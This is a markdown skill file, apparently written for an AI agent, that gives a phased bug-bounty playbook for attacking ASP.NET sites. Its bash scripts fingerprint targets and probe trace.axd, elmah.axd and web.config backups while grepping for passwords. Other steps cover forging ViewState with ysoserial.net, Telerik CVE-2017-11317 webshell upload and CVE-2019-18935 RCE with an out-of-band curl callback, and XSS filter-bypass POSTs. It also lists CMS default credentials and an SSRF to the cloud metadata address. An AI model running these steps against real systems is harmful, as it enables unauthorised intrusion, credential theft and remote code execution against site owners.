---
name: k1nzr3c0n-hunt-aspnet
description: "Hunt ASP.NET specific vulnerabilities. ViewState deserialization (without MachineKey = low; with MachineKey forged = Critical RCE), Telerik UI CVEs (CVE-2017-11317 arbitrary file upload, CVE-2019-18935 deserialization RCE), trace.axd/elmah.axd info disclosure, request-validator bypass (%00, Unicode), Sitecore/DNN/Umbraco default creds + CVEs."
tags: [aspnet, viewstate, telerik, rce, dotnet, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — ASP.NET Specific

> **Crown jewel**: Telerik CVE-2019-18935 + exposed /Telerik.Web.UI.WebResource.axd = RCE without auth.
> **ViewState**: only exploitable for RCE when MachineKey is recovered or __VIEWSTATE is unsigned.

---

## Phase 0 — Fingerprint ASP.NET

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_aspnet_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"

echo "=== ASP.NET Fingerprinting ==="
curl -sI "https://${TARGET}/" | grep -iE 'x-powered-by|x-aspnet|aspnet|X-AspNetMvc-Version|ASP.NET' | sed 's/^/  /'

# Error-based fingerprinting
curl -sk "https://${TARGET}/nonexistent.aspx" | grep -i 'asp.net\|System\.\|IIS\|Runtime Error\|Stack Trace' | head -3 | sed 's/^/  /'

# ASP.NET path extensions
for EXT in aspx asp ashx asmx axd svc; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/default.${EXT}")
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [${CODE}] default.${EXT}"
done
```

## Phase 1 — trace.axd and elmah.axd

```bash
echo "=== Diagnostic Endpoint Discovery ==="
BASE="https://${TARGET}"

DIAG_PATHS=(
  "/trace.axd"
  "/elmah.axd"
  "/elmah.axd?spacer=gridHeader"
  "/admin/elmah.axd"
  "/Error/Elmah"
  "/mini-profiler-resources/results-index"
  "/mini-profiler-resources/results-list"
  "/glimpse/settings"
  "/_layouts/settings.aspx"
  "/sitemanager"
  "/umbraco/webservices/codeEditorSave.asmx"
  "/Sitefinity/SystemConsole"
  "/CFIDE/administrator"
  "/web.config"
  "/web.config.bak"
  "/web.config.old"
)

for PATH_D in "${DIAG_PATHS[@]}"; do
  CODE=$(curl -sk -o /tmp/aspnet_check -w "%{http_code}" "${BASE}${PATH_D}")
  if [ "$CODE" = "200" ]; then
    echo "  [HIT] ${PATH_D}"
    grep -i "connectionstring\|password\|secret\|Session\|Request\|exception\|error" /tmp/aspnet_check | head -3 | sed 's/^/    /'
  fi
done
```

## Phase 2 — ViewState Analysis

```bash
echo "=== ViewState Analysis ==="
BASE="https://${TARGET}"

# Capture __VIEWSTATE from form
RESP=$(curl -sk "${BASE}/default.aspx" 2>/dev/null || curl -sk "${BASE}/" 2>/dev/null)
VIEWSTATE=$(echo "$RESP" | grep -oP '(?<=value=")[A-Za-z0-9+/=]{40,}' | head -1)
echo "  ViewState captured: ${VIEWSTATE:0:50}..."

# Check if validation enabled (MAC present)
echo ""
echo "  Decode ViewState for analysis:"
echo "  echo '$VIEWSTATE' | base64 -d | xxd | head -10"
echo ""
echo "  No signature (MAC) = unsigned ViewState = possible deserialization attack"
echo "  With signature = need MachineKey first"
echo ""
echo "  MachineKey recovery steps:"
echo "  1. Find web.config leak (via LFI, trace.axd, backup files)"
echo "  2. web.config contains: <machineKey validationKey=... decryptionKey=...>"
echo "  3. If validationKey found → forge ViewState payload using ysoserial.net"
echo "  ysoserial.net: --gadget=TypeConfuseDelegate --formatter=LosFormatter -o base64"
```

## Phase 3 — Telerik UI Exploitation

```bash
echo "=== Telerik RadAsyncUpload (CVE-2017-11317 + CVE-2019-18935) ==="
BASE="https://${TARGET}"

# Detect Telerik endpoint
for PATH_T in \
  "/Telerik.Web.UI.WebResource.axd" \
  "/Telerik.Web.UI.DialogHandler.aspx" \
  "/ChartImage.axd" \
  "/ScriptResource.axd"; do
  CODE=$(curl -sk -o /tmp/telerik_check -w "%{http_code}" "${BASE}${PATH_T}?type=rau")
  echo "  [${CODE}] ${PATH_T}"
  if [ "$CODE" = "200" ] || [ "$CODE" = "500" ]; then
    grep -i 'Telerik\|RadUpload\|version' /tmp/telerik_check | head -2 | sed 's/^/    /'
    echo "    Potential Telerik endpoint — check version in response"
  fi
done

echo ""
echo "CVE-2017-11317 (arbitrary file upload via RadAsyncUpload):"
echo "  Tool: https://github.com/bysense/RasuUpload-CVE-2017-11317"
echo "  Upload .aspx webshell to /App_Data/RadUploadTemp/"
echo ""
echo "CVE-2019-18935 (deserialization RCE — Telerik.Web.UI < 2020.1.114):"
echo "  Tool: https://github.com/bysense/CVE-2019-18935"
echo "  POST to /Telerik.Web.UI.WebResource.axd?type=rau with serialized payload"
echo "  OOB confirmation: curl http://${OOB}/telerik-rce"
```

## Phase 4 — Request Validator Bypass

```bash
echo "=== Request Validator Bypass ==="
BASE="https://${TARGET}"

echo "ASP.NET request validator blocks: <script>, javascript:, %, etc."
echo ""
echo "Bypass techniques:"

# Null byte bypass (ASP.NET Framework only, not Core)
echo "[1] Null byte:"
curl -sk -X POST "${BASE}/comment" \
  -d "comment=%00<script>alert(1)</script>" | grep -i 'alert\|<script' | sed 's/^/  [NULL-BYTE] /'

# Unicode variation
echo "[2] Unicode variation:"
curl -sk -X POST "${BASE}/comment" \
  -d "comment=<sCrİpt>alert(1)</script>" | grep -i 'alert\|script' | sed 's/^/  [UNICODE] /'

# ValidateRequest=false header
echo "[3] X-Requested-With AJAX bypass (some sites disable validation for AJAX):"
curl -sk -X POST "${BASE}/comment" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "comment=<script>alert(1)</script>" | grep -i 'alert\|<script' | sed 's/^/  [AJAX] /'
```

## Phase 5 — CMS Default Creds

```bash
echo "=== ASP.NET CMS Default Credentials ==="
BASE="https://${TARGET}"

declare -A CMS_PATHS
CMS_PATHS["/umbraco"]="-"
CMS_PATHS["/umbraco/backoffice/UmbracoApi/Authentication/GetRemainingTimeoutSeconds"]="-"
CMS_PATHS["/Admin"]="-"
CMS_PATHS["/DesktopModules/HTML/default.aspx"]="-"  # DNN
CMS_PATHS["/Sitefinity/UserControls/Users/LoginForm.aspx"]="-"
CMS_PATHS["/sitecore/login"]="-"

for CMS_PATH in "${!CMS_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${CMS_PATH}")
  echo "  [${CODE}] ${CMS_PATH}"
done

echo ""
echo "Default credentials to test:"
echo "  DNN (DotNetNuke): admin / password, host / dnnhost"
echo "  Umbraco: admin@example.com / admin123!, umbraco / umbraco1!"
echo "  Sitecore: admin / b, sitecore\\admin / b"
echo "  Orchard: admin / Password1!"
echo ""
echo "Umbraco SSRF (if authenticated):"
echo "  POST /umbraco/backoffice/preview/GetPreview with url=http://169.254.169.254/"
```

## Gate 0

```bash
echo "=== ASP.NET Gate 0 ==="
echo "  □ trace.axd: DB connection strings or passwords visible"
echo "  □ elmah.axd: exception details with stack traces revealing internal paths"
echo "  □ ViewState: unsigned (no MAC) AND deserialization payload executes"
echo "  □ Telerik: OOB callback or webshell accessible post-upload"
echo "  □ web.config: machineKey found AND ViewState RCE confirmed"
echo "  □ Request validator: XSS payload reflected with null-byte bypass"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
trace.axd exposed on [target.com/trace.axd]: application trace reveals DB_CONNECTION_STRING including password, session IDs of other users — High information disclosure
Telerik CVE-2019-18935 on [target.com]: /Telerik.Web.UI.WebResource.axd?type=rau accepts deserialization payload → confirmed RCE via OOB callback to rce.oastify.com
ViewState deserialization: web.config exposed via LFI reveals machineKey; forged ViewState executes OS command → Critical RCE
```
